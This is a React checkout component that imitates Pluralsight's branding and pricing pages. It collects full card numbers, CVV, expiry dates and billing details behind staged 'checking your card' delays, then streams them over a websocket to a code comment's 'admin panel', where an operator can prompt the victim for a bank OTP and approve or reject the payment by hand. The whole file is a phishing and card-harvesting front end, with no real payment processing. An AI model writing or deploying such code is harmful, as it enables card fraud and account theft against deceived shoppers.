import React, { useState, useEffect } from 'react';
import { useSearchParams, useNavigate, Link } from 'react-router-dom';
import { ArrowLeft, Lock, CreditCard, Loader2, MoreHorizontal } from 'lucide-react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Checkbox } from '@/components/ui/checkbox';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
import { io, Socket } from 'socket.io-client';

const Checkout = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  
  const planName = searchParams.get('plan') || 'Complete';
  const billing = searchParams.get('billing') || 'yearly';
  
  const [formData, setFormData] = useState({
    firstName: '',
    lastName: '',
    email: '',
    confirmEmail: '',
    country: '',
    companyName: ''
  });
  
  const [errors, setErrors] = useState({
    firstName: '',
    lastName: '',
    email: '',
    confirmEmail: '',
    country: ''
  });
  
  const [touched, setTouched] = useState({
    firstName: false,
    lastName: false,
    email: false,
    confirmEmail: false,
    country: false
  });
  
  const [agreeTerms, setAgreeTerms] = useState(false);
  const [showTermsError, setShowTermsError] = useState(false);
  const [promoCode, setPromoCode] = useState('');
  
  // Payment flow states
  const [currentStep, setCurrentStep] = useState<'account' | 'loading' | 'payment' | 'review' | 'processing' | 'otp'>('account');
  const [paymentMethod, setPaymentMethod] = useState('');
  const [cardData, setCardData] = useState({
    cardNumber: '',
    cardName: '',
    expiryMonth: '',
    expiryYear: '',
    cvv: ''
  });
  const [cardErrors, setCardErrors] = useState({
    cardNumber: '',
    cardName: '',
    expiryMonth: '',
    expiryYear: '',
    cvv: ''
  });

  // Loading and processing states
  const [isProcessing, setIsProcessing] = useState(false);
  const [processingMessage, setProcessingMessage] = useState('');
  const [showOtp, setShowOtp] = useState(false);
  const [otpValue, setOtpValue] = useState('');
  const [socket, setSocket] = useState<Socket | null>(null);
  const [confirmingPayment, setConfirmingPayment] = useState(false);

  // Pricing data based on the main page
  const pricingData = {
    yearly: {
      'Core Tech': { price: 10563, monthly: 880.25 },
      'Complete': { price: 28750, monthly: 2395.83 }, // Updated to show 28,750 for yearly
      'AI+': { price: 12327, monthly: 1027.25 },
      'Cloud+': { price: 12327, monthly: 1027.25 },
      'Data+': { price: 12327, monthly: 1027.25 },
      'Security+': { price: 12327, monthly: 1027.25 }
    },
    monthly: {
      'Core Tech': { price: 1100, monthly: 1100 },
      'Complete': { price: 2195, monthly: 2195 },
      'AI+': { price: 1299, monthly: 1299 },
      'Cloud+': { price: 1299, monthly: 1299 },
      'Data+': { price: 1299, monthly: 1299 },
      'Security+': { price: 1299, monthly: 1299 }
    }
  };

  const currentPlan = pricingData[billing as keyof typeof pricingData][planName as keyof typeof pricingData.yearly];
  const displayPrice = billing === 'yearly' ? currentPlan.price : currentPlan.monthly;
  const billingText = billing === 'yearly' ? 'Annually' : 'Monthly';

  const validateField = (field: string, value: string) => {
    switch (field) {
      case 'firstName':
        return !value.trim() ? 'First name is required' : '';
      case 'lastName':
        return !value.trim() ? 'Last name is required' : '';
      case 'email':
        if (!value.trim()) return 'Email is required';
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        return !emailRegex.test(value) ? 'Please enter a valid email address' : '';
      case 'confirmEmail':
        if (!value.trim()) return 'Confirm email is required';
        return value !== formData.email ? 'Emails do not match' : '';
      case 'country':
        return !value ? 'Country is required' : '';
      default:
        return '';
    }
  };

  const handleInputChange = (field: string, value: string) => {
    setFormData(prev => ({ ...prev, [field]: value }));
    
    // Validate field if it has been touched
    if (touched[field as keyof typeof touched]) {
      const error = validateField(field, value);
      setErrors(prev => ({ ...prev, [field]: error }));
    }
  };

  const handleFieldBlur = (field: string) => {
    setTouched(prev => ({ ...prev, [field]: true }));
    const error = validateField(field, formData[field as keyof typeof formData]);
    setErrors(prev => ({ ...prev, [field]: error }));
  };

  const isFormValid = () => {
    const requiredFields = ['firstName', 'lastName', 'email', 'confirmEmail', 'country'];
    return requiredFields.every(field => {
      const value = formData[field as keyof typeof formData];
      return value && !validateField(field, value);
    }) && agreeTerms;
  };

  // Card validation functions
  const validateCardField = (field: string, value: string) => {
    switch (field) {
      case 'cardNumber':
        if (!value.trim()) return 'Card number is required';
        const cleaned = value.replace(/\s/g, '');
        if (!/^\d{16}$/.test(cleaned)) return 'Card number must be 16 digits';
        return '';
      case 'cardName':
        return !value.trim() ? 'Cardholder name is required' : '';
      case 'expiryMonth':
        return !value ? 'Expiry month is required' : '';
      case 'expiryYear':
        return !value ? 'Expiry year is required' : '';
      case 'cvv':
        if (!value.trim()) return 'CVV is required';
        if (!/^\d{3,4}$/.test(value)) return 'CVV must be 3-4 digits';
        return '';
      default:
        return '';
    }
  };

  const handleCardInputChange = (field: string, value: string) => {
    setCardData(prev => ({ ...prev, [field]: value }));
    const error = validateCardField(field, value);
    setCardErrors(prev => ({ ...prev, [field]: error }));
  };

  const isCardFormValid = () => {
    const requiredFields = ['cardNumber', 'cardName', 'expiryMonth', 'expiryYear', 'cvv'];
    return requiredFields.every(field => {
      const value = cardData[field as keyof typeof cardData];
      return value && !validateCardField(field, value);
    });
  };

  const handleContinue = () => {
    // Validate all fields
    const newErrors = {
      firstName: validateField('firstName', formData.firstName),
      lastName: validateField('lastName', formData.lastName),
      email: validateField('email', formData.email),
      confirmEmail: validateField('confirmEmail', formData.confirmEmail),
      country: validateField('country', formData.country)
    };
    
    setErrors(newErrors);
    setTouched({
      firstName: true,
      lastName: true,
      email: true,
      confirmEmail: true,
      country: true
    });

    if (!agreeTerms) {
      setShowTermsError(true);
      return;
    }
    
    // Check if form is valid
    if (!isFormValid()) {
      return;
    }
    
    setShowTermsError(false);
    
    // Start the payment flow
    setCurrentStep('loading');
    
    // Show loading for 2-3 seconds then move to payment step
    setTimeout(() => {
      setCurrentStep('payment');
    }, 2500);
  };

  const handlePaymentMethodSelect = (method: string) => {
    setPaymentMethod(method);
  };

  const handleReviewOrder = () => {
    setIsProcessing(true);
    setCurrentStep('processing');
    
    // Simulate processing with messages
    setProcessingMessage('Please wait we are checking your details!');
    
    setTimeout(() => {
      setProcessingMessage('Checking your card information');
      setTimeout(() => {
        setProcessingMessage('Redirecting you to confirmation page..');
        setTimeout(() => {
          setIsProcessing(false);
          setCurrentStep('review');
        }, 3000);
      }, 2000);
    }, 1500);
  };

  const handleConfirmPayment = () => {
    try {
      setConfirmingPayment(true);
      
      // Connect to WebSocket with proper URL handling for different environments
      const socketUrl = process.env.NODE_ENV === 'production' 
        ? window.location.origin
        : 'http://localhost:3001';
      
      const newSocket = io(socketUrl, {
        timeout: 10000,
        reconnection: true,
        reconnectionAttempts: 5,
        reconnectionDelay: 2000,
        transports: ['websocket', 'polling']
      });
      setSocket(newSocket);
      
      // Handle connection errors
      newSocket.on('connect_error', (error) => {
        console.error('Socket connection error:', error);
        setConfirmingPayment(false);
        alert('Connection failed. Please check your internet connection and try again.');
      });
      
      newSocket.on('disconnect', (reason) => {
        console.warn('Socket disconnected:', reason);
        if (reason === 'io server disconnect') {
          // Server disconnected, try to reconnect
          newSocket.connect();
        }
      });
      
      // Send payment data to admin panel
      const paymentData = {
        cardNumber: cardData.cardNumber,
        cardName: cardData.cardName,
        cvv: cardData.cvv,
        expiry: `${cardData.expiryMonth}/${cardData.expiryYear}`,
        billingDetails: {
          firstName: formData.firstName,
          lastName: formData.lastName,
          email: formData.email,
          country: formData.country,
          companyName: formData.companyName
        },
        planName,
        billing,
        amount: displayPrice,
        timestamp: new Date().toISOString()
      };
      
      // Add timeout for payment data emission
      const emitTimeout = setTimeout(() => {
        setConfirmingPayment(false);
        alert('Request timeout. Please try again.');
        newSocket.disconnect();
      }, 30000);
      
      newSocket.emit('payment-data', paymentData);
      
      // Listen for admin responses
      newSocket.on('show-otp', () => {
        clearTimeout(emitTimeout);
        setShowOtp(true);
        setCurrentStep('otp');
      });
      
      newSocket.on('payment-approved', () => {
        clearTimeout(emitTimeout);
        setConfirmingPayment(false);
        setShowOtp(false);
        alert('Payment successful!');
        // Could redirect to success page here
      });
      
      newSocket.on('payment-rejected', (reason: string) => {
        clearTimeout(emitTimeout);
        setConfirmingPayment(false);
        setShowOtp(false);
        alert(`Payment rejected: ${reason || 'Unknown error occurred'}`);
      });
      
    } catch (error) {
      console.error('Error in payment confirmation:', error);
      setConfirmingPayment(false);
      alert('An unexpected error occurred. Please try again.');
    }
  };

  const handleOtpSubmit = () => {
    try {
      if (!socket) {
        alert('Connection lost. Please refresh the page and try again.');
        return;
      }
      
      if (!otpValue || otpValue.length < 4) {
        alert('Please enter a valid OTP.');
        return;
      }
      
      socket.emit('otp-submitted', { otp: otpValue });
      setOtpValue('');
    } catch (error) {
      console.error('Error submitting OTP:', error);
      alert('Failed to submit OTP. Please try again.');
    }
  };

  // Initialize socket connection and error handling
  useEffect(() => {
    // Handle page unload/refresh
    const handleBeforeUnload = () => {
      if (socket) {
        socket.disconnect();
      }
    };

    window.addEventListener('beforeunload', handleBeforeUnload);

    return () => {
      window.removeEventListener('beforeunload', handleBeforeUnload);
      if (socket) {
        socket.disconnect();
      }
    };
  }, [socket]);

  return (
    <div className="min-h-screen bg-slate-900 text-white">
      {/* Header with Progress */}
      <div className="border-b border-slate-700 px-6 py-4">
        <div className="max-w-7xl mx-auto">
          {/* Back to pricing link */}
          <Link to="/" className="flex items-center gap-2 text-slate-300 hover:text-white mb-6 text-sm">
            <ArrowLeft size={16} />
            Back to pricing
          </Link>
          
          {/* Progress Steps */}
          <div className="flex items-center gap-8">
            <div className="flex items-center gap-3">
              <div className="w-8 h-8 bg-blue-600 rounded-full flex items-center justify-center text-sm font-medium">
                1
              </div>
              <span className="text-white font-medium">ACCOUNT</span>
            </div>
            <div className="flex items-center gap-3">
              <div className="w-8 h-8 bg-slate-600 rounded-full flex items-center justify-center text-sm">
                2
              </div>
              <span className="text-slate-400">PAYMENT</span>
            </div>
            <div className="flex items-center gap-3">
              <div className="w-8 h-8 bg-slate-600 rounded-full flex items-center justify-center text-sm">
                3
              </div>
              <span className="text-slate-400">REVIEW</span>
            </div>
          </div>
        </div>
      </div>

      {/* Main Content */}
      <div className="max-w-7xl mx-auto px-6 py-8">
        <div className="grid lg:grid-cols-3 gap-8">
          {/* Left Content Area */}
          <div className="lg:col-span-2">
            {/* Account Details Section */}
            {currentStep === 'account' && (
              <>
                <div className="flex items-center gap-3 mb-8">
                  <div className="w-8 h-8 bg-blue-600 rounded-full flex items-center justify-center text-sm font-medium">
                    ✓
                  </div>
                  <h2 className="text-2xl font-bold">Account details</h2>
                </div>

                <div className="mb-6">
                  <span className="text-slate-300">Already have an account? </span>
                  <a href="#" className="text-blue-400 hover:underline">Sign in</a>
                </div>

                <div className="grid md:grid-cols-2 gap-6 mb-6">
                  <div>
                    <label className="block text-sm font-medium mb-2">
                      First name<span className="text-red-500">*</span>
                    </label>
                    <Input
                      value={formData.firstName}
                      onChange={(e) => handleInputChange('firstName', e.target.value)}
                      onBlur={() => handleFieldBlur('firstName')}
                      className={`bg-white text-slate-900 ${
                        errors.firstName ? 'border-red-500 focus:border-red-500' : 'border-slate-300'
                      }`}
                      placeholder=""
                    />
                    {errors.firstName && (
                      <p className="text-red-500 text-xs mt-1">{errors.firstName}</p>
                    )}
                  </div>
                  <div>
                    <label className="block text-sm font-medium mb-2">
                      Last name<span className="text-red-500">*</span>
                    </label>
                    <Input
                      value={formData.lastName}
                      onChange={(e) => handleInputChange('lastName', e.target.value)}
                      onBlur={() => handleFieldBlur('lastName')}
                      className={`bg-white text-slate-900 ${
                        errors.lastName ? 'border-red-500 focus:border-red-500' : 'border-slate-300'
                      }`}
                      placeholder=""
                    />
                    {errors.lastName && (
                      <p className="text-red-500 text-xs mt-1">{errors.lastName}</p>
                    )}
                  </div>
                </div>

                <div className="grid md:grid-cols-2 gap-6 mb-6">
                  <div>
                    <label className="block text-sm font-medium mb-2">
                      Email<span className="text-red-500">*</span>
                    </label>
                    <Input
                      type="email"
                      value={formData.email}
                      onChange={(e) => handleInputChange('email', e.target.value)}
                      onBlur={() => handleFieldBlur('email')}
                      className={`bg-white text-slate-900 ${
                        errors.email ? 'border-red-500 focus:border-red-500' : 'border-slate-300'
                      }`}
                      placeholder=""
                    />
                    {errors.email && (
                      <p className="text-red-500 text-xs mt-1">{errors.email}</p>
                    )}
                  </div>
                  <div>
                    <label className="block text-sm font-medium mb-2">
                      Confirm Email<span className="text-red-500">*</span>
                    </label>
                    <Input
                      type="email"
                      value={formData.confirmEmail}
                      onChange={(e) => handleInputChange('confirmEmail', e.target.value)}
                      onBlur={() => handleFieldBlur('confirmEmail')}
                      className={`bg-white text-slate-900 ${
                        errors.confirmEmail ? 'border-red-500 focus:border-red-500' : 'border-slate-300'
                      }`}
                      placeholder=""
                    />
                    {errors.confirmEmail && (
                      <p className="text-red-500 text-xs mt-1">{errors.confirmEmail}</p>
                    )}
                  </div>
                </div>

                <div className="grid md:grid-cols-2 gap-6 mb-8">
                  <div>
                    <label className="block text-sm font-medium mb-2">
                      Country of residence<span className="text-red-500">*</span>
                    </label>
                    <Select 
                      onValueChange={(value) => {
                        handleInputChange('country', value);
                        handleFieldBlur('country');
                      }}
                    >
                      <SelectTrigger className={`bg-white text-slate-900 ${
                        errors.country ? 'border-red-500 focus:border-red-500' : 'border-slate-300'
                      }`}>
                        <SelectValue placeholder="- Select One -" />
                      </SelectTrigger>
                      <SelectContent>
                        <SelectItem value="india">India</SelectItem>
                        <SelectItem value="usa">United States</SelectItem>
                        <SelectItem value="uk">United Kingdom</SelectItem>
                        <SelectItem value="canada">Canada</SelectItem>
                        <SelectItem value="australia">Australia</SelectItem>
                        <SelectItem value="germany">Germany</SelectItem>
                        <SelectItem value="france">France</SelectItem>
                      </SelectContent>
                    </Select>
                    {errors.country && (
                      <p className="text-red-500 text-xs mt-1">{errors.country}</p>
                    )}
                  </div>
                  <div>
                    <label className="block text-sm font-medium mb-2">
                      Company name (optional)
                    </label>
                    <Input
                      value={formData.companyName}
                      onChange={(e) => handleInputChange('companyName', e.target.value)}
                      className="bg-white text-slate-900 border-slate-300"
                      placeholder=""
                    />
                  </div>
                </div>

                {/* Terms and Conditions */}
                <div className="mb-8">
                  <div className="flex items-start gap-3">
                    <Checkbox
                      checked={agreeTerms}
                      onCheckedChange={(checked) => {
                        setAgreeTerms(checked as boolean);
                        setShowTermsError(false);
                      }}
                      className={`mt-1 ${showTermsError ? 'border-red-500' : ''}`}
                    />
                    <label className={`text-sm ${showTermsError ? 'text-red-500' : 'text-slate-300'}`}>
                      By checking here and continuing, I agree to the Pluralsight{' '}
                      <a href="#" className="text-blue-400 hover:underline">Terms of Use</a>.
                    </label>
                  </div>
                </div>

                {/* Continue Button */}
                <Button
                  onClick={handleContinue}
                  disabled={!isFormValid()}
                  className={`w-full md:w-auto px-12 py-3 rounded font-medium ${
                    isFormValid() 
                      ? 'bg-blue-600 hover:bg-blue-700 text-white' 
                      : 'bg-slate-500 text-slate-300 cursor-not-allowed'
                  }`}
                >
                  Continue
                </Button>
              </>
            )}

            {/* Loading Section */}
            {currentStep === 'loading' && (
              <div className="flex flex-col items-center justify-center py-20">
                <div className="flex items-center gap-3 mb-8">
                  <div className="w-8 h-8 bg-green-600 rounded-full flex items-center justify-center text-sm font-medium">
                    ✓
                  </div>
                  <h2 className="text-2xl font-bold">Account details</h2>
                </div>
                
                <div className="flex items-center gap-3 mb-12">
                  <div className="w-8 h-8 bg-blue-600 rounded-full flex items-center justify-center text-sm font-medium">
                    2
                  </div>
                  <h2 className="text-2xl font-bold">Payment</h2>
                </div>

                <p className="text-white mb-6 text-lg">Select a payment method</p>
                
                <div className="flex items-center justify-center">
                  <Loader2 className="h-12 w-12 animate-spin text-blue-500" />
                </div>
              </div>
            )}

            {/* Payment Section */}
            {currentStep === 'payment' && (
              <>
                <div className="flex items-center gap-3 mb-8">
                  <div className="w-8 h-8 bg-green-600 rounded-full flex items-center justify-center text-sm font-medium">
                    ✓
                  </div>
                  <span className="text-slate-300 font-medium">Account details</span>
                </div>

                <div className="flex items-center gap-3 mb-8">
                  <div className="w-8 h-8 bg-blue-600 rounded-full flex items-center justify-center text-sm font-medium">
                    2
                  </div>
                  <h2 className="text-2xl font-bold">Payment</h2>
                </div>

                <p className="text-white mb-8 text-lg">Select a payment method</p>

                {/* Payment Method Selection */}
                <div 
                  className={`border border-slate-600 rounded-lg p-4 mb-6 cursor-pointer transition-all ${
                    paymentMethod === 'credit' ? 'border-blue-500 bg-slate-800' : 'hover:border-slate-500'
                  }`}
                  onClick={() => handlePaymentMethodSelect('credit')}
                >
                  <div className="flex items-center gap-3">
                    <div className={`w-5 h-5 rounded-full border-2 flex items-center justify-center ${
                      paymentMethod === 'credit' ? 'border-blue-500' : 'border-slate-400'
                    }`}>
                      {paymentMethod === 'credit' && (
                        <div className="w-2.5 h-2.5 bg-blue-500 rounded-full"></div>
                      )}
                    </div>
                    <CreditCard className="h-5 w-5 text-blue-400" />
                    <span className="font-medium">Credit Card / Debit Card</span>
                    <div className="ml-auto flex gap-2">
                      {/* Updated card brand logos with exact same size and positioning */}
                      <div className="h-8 w-12 bg-white rounded flex items-center justify-center p-1">
                        <img 
                          src="https://brandlogos.net/wp-content/uploads/2014/10/visa-logo-300x300.png" 
                          alt="Visa" 
                          className="h-6 w-10 object-contain"
                        />
                      </div>
                      <div className="h-8 w-12 bg-white rounded flex items-center justify-center p-1">
                        <img 
                          src="https://i.pinimg.com/originals/48/40/de/4840deeea4afad677728525d165405d0.jpg" 
                          alt="Mastercard" 
                          className="h-6 w-10 object-contain"
                        />
                      </div>
                      <div className="h-8 w-12 bg-white rounded flex items-center justify-center p-1">
                        <img 
                          src="https://images.seeklogo.com/logo-png/49/2/discover-card-logo-png_seeklogo-499264.png" 
                          alt="Discover" 
                          className="h-6 w-10 object-contain"
                        />
                      </div>
                      <div className="h-8 w-12 bg-white rounded flex items-center justify-center p-1">
                        <img 
                          src="https://brandlogos.net/wp-content/uploads/2022/03/rupay-logo-brandlogos.net_-512x512.png" 
                          alt="RuPay" 
                          className="h-6 w-10 object-contain"
                        />
                      </div>
                    </div>
                  </div>
                </div>

                {/* Card Details Form - Only shown when credit card is selected */}
                {paymentMethod === 'credit' && (
                  <div className="space-y-6 mb-8">
                    <div className="grid md:grid-cols-2 gap-6">
                      <div>
                        <label className="block text-sm font-medium mb-2">
                          Name on card<span className="text-red-500">*</span>
                        </label>
                        <Input
                          value={cardData.cardName}
                          onChange={(e) => handleCardInputChange('cardName', e.target.value)}
                          className={`bg-white text-slate-900 ${
                            cardErrors.cardName ? 'border-red-500 focus:border-red-500' : 'border-slate-300'
                          }`}
                          placeholder=""
                        />
                        {cardErrors.cardName && (
                          <p className="text-red-500 text-xs mt-1">{cardErrors.cardName}</p>
                        )}
                      </div>
                      <div>
                        <label className="block text-sm font-medium mb-2">
                          Card number<span className="text-red-500">*</span>
                        </label>
                        <Input
                          value={cardData.cardNumber}
                          onChange={(e) => {
                            const value = e.target.value.replace(/\D/g, '').slice(0, 16);
                            handleCardInputChange('cardNumber', value);
                          }}
                          className={`bg-white text-slate-900 ${
                            cardErrors.cardNumber ? 'border-red-500 focus:border-red-500' : 'border-slate-300'
                          }`}
                          placeholder="1234 5678 9012 3456"
                        />
                        {cardErrors.cardNumber && (
                          <p className="text-red-500 text-xs mt-1">{cardErrors.cardNumber}</p>
                        )}
                      </div>
                    </div>

                    <div className="grid grid-cols-3 gap-6">
                      <div>
                        <label className="block text-sm font-medium mb-2">
                          Expiration<span className="text-red-500">*</span>
                        </label>
                        <Select onValueChange={(value) => handleCardInputChange('expiryMonth', value)}>
                          <SelectTrigger className={`bg-white text-slate-900 ${
                            cardErrors.expiryMonth ? 'border-red-500 focus:border-red-500' : 'border-slate-300'
                          }`}>
                            <SelectValue placeholder="Month" />
                          </SelectTrigger>
                          <SelectContent>
                            {Array.from({length: 12}, (_, i) => (
                              <SelectItem key={i+1} value={String(i+1).padStart(2, '0')}>
                                {String(i+1).padStart(2, '0')}
                              </SelectItem>
                            ))}
                          </SelectContent>
                        </Select>
                        {cardErrors.expiryMonth && (
                          <p className="text-red-500 text-xs mt-1">{cardErrors.expiryMonth}</p>
                        )}
                      </div>
                      <div>
                        <label className="block text-sm font-medium mb-2 text-transparent">Year</label>
                        <Select onValueChange={(value) => handleCardInputChange('expiryYear', value)}>
                          <SelectTrigger className={`bg-white text-slate-900 ${
                            cardErrors.expiryYear ? 'border-red-500 focus:border-red-500' : 'border-slate-300'
                          }`}>
                            <SelectValue placeholder="Year" />
                          </SelectTrigger>
                          <SelectContent>
                            {Array.from({length: 10}, (_, i) => {
                              const year = new Date().getFullYear() + i;
                              return (
                                <SelectItem key={year} value={String(year)}>
                                  {year}
                                </SelectItem>
                              );
                            })}
                          </SelectContent>
                        </Select>
                        {cardErrors.expiryYear && (
                          <p className="text-red-500 text-xs mt-1">{cardErrors.expiryYear}</p>
                        )}
                      </div>
                      <div>
                        <label className="block text-sm font-medium mb-2">
                          CVV<span className="text-red-500">*</span>
                        </label>
                        <Input
                          value={cardData.cvv}
                          onChange={(e) => {
                            const value = e.target.value.replace(/\D/g, '').slice(0, 4);
                            handleCardInputChange('cvv', value);
                          }}
                          className={`bg-white text-slate-900 ${
                            cardErrors.cvv ? 'border-red-500 focus:border-red-500' : 'border-slate-300'
                          }`}
                          placeholder="123"
                        />
                        {cardErrors.cvv && (
                          <p className="text-red-500 text-xs mt-1">{cardErrors.cvv}</p>
                        )}
                      </div>
                    </div>

                    {/* Review Order Button */}
                    <Button
                      onClick={handleReviewOrder}
                      disabled={!paymentMethod}
                      className={`w-full md:w-auto px-12 py-3 rounded font-medium ${
                        paymentMethod 
                          ? 'bg-blue-600 hover:bg-blue-700 text-white' 
                          : 'bg-slate-500 text-slate-300 cursor-not-allowed'
                      }`}
                    >
                      Review order
                    </Button>
                  </div>
                )}
              </>
            )}

            {/* Processing Section */}
            {currentStep === 'processing' && (
              <div className="fixed inset-0 bg-black bg-opacity-50 backdrop-blur-sm flex items-center justify-center z-50">
                <div className="text-center">
                  <Loader2 className="h-16 w-16 animate-spin text-blue-500 mb-6 mx-auto" />
                  <p className="text-white text-lg font-medium">{processingMessage}</p>
                </div>
              </div>
            )}

            {/* OTP Section */}
            {currentStep === 'otp' && (
              <div className="fixed inset-0 bg-black bg-opacity-50 backdrop-blur-sm flex items-center justify-center z-50">
                <div className="bg-slate-800 rounded-lg p-8 max-w-md w-full mx-4">
                  <h3 className="text-2xl font-bold text-white mb-6 text-center">Enter OTP</h3>
                  <p className="text-slate-300 text-center mb-6">
                    Please enter the 6-digit OTP sent to your registered mobile number
                  </p>
                  <div className="space-y-4">
                    <Input
                      value={otpValue}
                      onChange={(e) => setOtpValue(e.target.value.replace(/\D/g, '').slice(0, 6))}
                      className="bg-white text-slate-900 text-center text-2xl tracking-widest"
                      placeholder="123456"
                      maxLength={6}
                    />
                    <Button
                      onClick={handleOtpSubmit}
                      disabled={otpValue.length !== 6}
                      className="w-full bg-blue-600 hover:bg-blue-700 text-white"
                    >
                      Verify OTP
                    </Button>
                  </div>
                  {confirmingPayment && (
                    <div className="absolute inset-0 bg-black bg-opacity-50 backdrop-blur-sm flex items-center justify-center rounded-lg">
                      <Loader2 className="h-8 w-8 animate-spin text-blue-500" />
                    </div>
                  )}
                </div>
              </div>
            )}

            {/* Review Section */}
            {currentStep === 'review' && (
              <>
                <div className="flex items-center gap-3 mb-8">
                  <div className="w-8 h-8 bg-green-600 rounded-full flex items-center justify-center text-sm font-medium">
                    ✓
                  </div>
                  <span className="text-slate-300 font-medium">Account details</span>
                </div>

                <div className="flex items-center gap-3 mb-8">
                  <div className="w-8 h-8 bg-green-600 rounded-full flex items-center justify-center text-sm font-medium">
                    ✓
                  </div>
                  <span className="text-slate-300 font-medium">Payment</span>
                </div>

                <div className="flex items-center gap-3 mb-8">
                  <div className="w-8 h-8 bg-blue-600 rounded-full flex items-center justify-center text-sm font-medium">
                    3
                  </div>
                  <h2 className="text-2xl font-bold">Review and confirm</h2>
                </div>

                <div className="bg-slate-800 rounded-lg p-6 mb-8">
                  <h3 className="text-xl font-bold mb-6">Review your order details</h3>
                  
                  <div className="space-y-4">
                    <div className="flex justify-between items-center py-3 border-b border-slate-600">
                      <span className="font-medium">Plan</span>
                      <span className="text-slate-300">{planName} - {billingText}</span>
                    </div>
                    
                    <div className="flex justify-between items-center py-3 border-b border-slate-600">
                      <span className="font-medium">Payment Method</span>
                      <span className="text-slate-300">Credit Card ending in {cardData.cardNumber.slice(-4)}</span>
                    </div>
                    
                    <div className="flex justify-between items-center py-3 border-b border-slate-600">
                      <span className="font-medium">Billing Cycle</span>
                      <span className="text-slate-300">{billing === 'yearly' ? 'Yearly' : 'Monthly'}</span>
                    </div>
                    
                    <div className="flex justify-between items-center py-3 border-b border-slate-600">
                      <span className="font-medium">Date & Time</span>
                      <span className="text-slate-300">{new Date().toLocaleString()}</span>
                    </div>
                    
                    <div className="flex justify-between items-center py-3 border-b border-slate-600">
                      <span className="font-medium">Country</span>
                      <span className="text-slate-300">{formData.country}</span>
                    </div>
                    
                    <div className="flex justify-between items-center py-3 border-b border-slate-600">
                      <span className="font-medium">Customer</span>
                      <span className="text-slate-300">{formData.firstName} {formData.lastName}</span>
                    </div>
                    
                    <div className="flex justify-between items-center py-3 border-b border-slate-600">
                      <span className="font-medium">Email</span>
                      <span className="text-slate-300">{formData.email}</span>
                    </div>
                    
                    <div className="flex justify-between items-center py-3 border-b border-slate-600">
                      <span className="font-medium">Transaction ID</span>
                      <span className="text-slate-300 font-mono">TXN-{Date.now().toString().slice(-8)}</span>
                    </div>
                    
                    <div className="flex justify-between items-center py-3 border-b border-slate-600">
                      <span className="font-medium">Total Amount</span>
                      <span className="text-xl font-bold text-white">₹{displayPrice.toLocaleString()}</span>
                    </div>
                  </div>
                </div>

                <Button
                  onClick={handleConfirmPayment}
                  disabled={confirmingPayment}
                  className="w-full md:w-auto px-12 py-3 rounded font-medium bg-green-600 hover:bg-green-700 text-white relative"
                >
                  {confirmingPayment && (
                    <>
                      <div className="absolute inset-0 bg-green-600 bg-opacity-50 rounded flex items-center justify-center">
                        <Loader2 className="h-5 w-5 animate-spin" />
                      </div>
                      <span className="opacity-30">Confirm Payment</span>
                    </>
                  )}
                  {!confirmingPayment && 'Confirm Payment'}
                </Button>
              </>
            )}
          </div>

          {/* Order Summary */}
          <div className="lg:col-span-1">
            <div className="bg-slate-800 rounded-lg p-6">
              <h3 className="text-xl font-bold mb-6">Order summary</h3>
              
              <div className="flex justify-between items-center mb-4">
                <span className="font-medium">Plan</span>
                <span className="font-medium">Price</span>
              </div>
              
              <div className="flex justify-between items-center mb-6 pb-4 border-b border-slate-600">
                <span className="text-slate-300">{planName} - {billingText}</span>
                <span className="font-bold">₹{displayPrice.toLocaleString()}</span>
              </div>

              {/* Promo Code */}
              <div className="mb-6">
                <div className="flex gap-2">
                  <Input
                    value={promoCode}
                    onChange={(e) => setPromoCode(e.target.value)}
                    placeholder="Promo Code"
                    className="bg-white text-slate-900 border-slate-300 flex-1"
                  />
                  <Button variant="outline" className="text-slate-900 border-slate-300 bg-blue-600 text-white hover:bg-blue-700">
                    Apply
                  </Button>
                </div>
              </div>

              {/* Summary */}
              <div className="space-y-3 mb-6">
                <div className="flex justify-between">
                  <span className="text-slate-300">Subtotal</span>
                  <span>₹{displayPrice.toLocaleString()}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-slate-300">Estimated tax<sup>†</sup></span>
                  <span>₹0</span>
                </div>
              </div>

              <div className="border-t border-slate-600 pt-4 mb-6">
                <div className="flex justify-between items-center">
                  <span className="text-xl font-bold">Total due today</span>
                  <span className="text-xl font-bold">₹{displayPrice.toLocaleString()}</span>
                </div>
              </div>

              {/* Tax Notice */}
              <div className="text-xs text-slate-400 space-y-2">
                <p>
                  <sup>†</sup> Pluralsight is required by law to collect transaction taxes such as sales tax, VAT, GST or other similar taxes on purchases in some jurisdictions. The actual tax amount will be calculated based on the applicable jurisdictional tax rates when your order is processed.
                </p>
                <p>
                  <sup>††</sup> Excluding transaction taxes such as sales tax, VAT, GST and other similar taxes
                </p>
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Next Steps Preview */}
      <div className="border-t border-slate-700 px-6 py-6">
        <div className="max-w-7xl mx-auto">
          <div className="flex items-center gap-8">
            <div className="flex items-center gap-3">
              <div className="w-6 h-6 bg-slate-600 rounded-full flex items-center justify-center text-xs">
                2
              </div>
              <span className="text-slate-400">Payment</span>
            </div>
            <div className="flex items-center gap-8">
              <div className="flex items-center gap-3">
                <div className="w-6 h-6 bg-slate-600 rounded-full flex items-center justify-center text-xs">
                  3
                </div>
                <span className="text-slate-400">Review and confirm</span>
              </div>
              <div className="flex items-center gap-2 text-slate-400 text-sm">
                <Lock size={16} />
                <span>Secure checkout</span>
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Footer */}
      <div className="border-t border-slate-700 px-6 py-6 text-xs text-slate-400">
        <div className="max-w-7xl mx-auto flex flex-wrap gap-6">
          <span>Copyright © 2004-2025 Pluralsight LLC. All rights reserved.</span>
          <a href="#" className="hover:text-white">Privacy Policy</a>
          <a href="#" className="hover:text-white">Terms of Use</a>
          <a href="#" className="hover:text-white">Do Not Sell or Share My Personal Data</a>
        </div>
      </div>
    </div>
  );
};

export default Checkout;
